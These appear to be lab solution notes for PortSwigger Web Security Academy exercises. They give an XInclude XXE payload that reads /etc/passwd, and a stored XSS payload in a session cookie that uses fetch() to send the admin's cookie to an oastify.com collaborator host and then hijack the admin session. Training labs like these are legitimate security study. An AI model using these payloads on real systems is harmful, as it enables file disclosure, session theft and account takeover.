# Essential Skills
## Obfuscation attacks using encoding
[Link](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)

### LAB: Discovering vulnerabilities quickly with targeted scanning
Use the `Do active scan` on the request `POST /product/stock HTTP/2` found that it is vulnerable to XXE Injection using `XInclude`. URL encode this and use it as the value of `productId` in the `POST /product/stock HTTP/2` request:

    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>

### LAB: Scanning non-standard data structures
Found non-standard data structure in the session cookie:

    wiener:3a14AzXCGmCsJmikiRHIzZVUIUOnMQDIg7

Mark the `wiener` and `3a14AzXCGmCsJmikiRHIzZVUIUOnMQDIg7` in `Intruder` and use the `Scan selected insertion point` option. After a while notice a stored XSS vulnerability using this payload:

    '"><svg/onload=fetch`//iqcql7ictt5dhrhtrv79ogen2e88wykqae14oucj\.oastify.com`>:14AzXCGmCsJmikiRHIzZVUIUOnMQDIg7

Change it to steal the admin's cookie:

    '"><svg/onload=fetch`//6mtwihm7c4tj1u0dx9zovquir9x1lt9i.oastify.com/${encodeURIComponent(document.cookie)}`>:14AzXCGmCsJmikiRHIzZVUIUOnMQDIg7

In the `Collaborator` tab, notice the coming HTTP request, examine the Request to Collaborator to obtain the admin session cookie. Use this cookie to enter admin panel and delete Carlos.


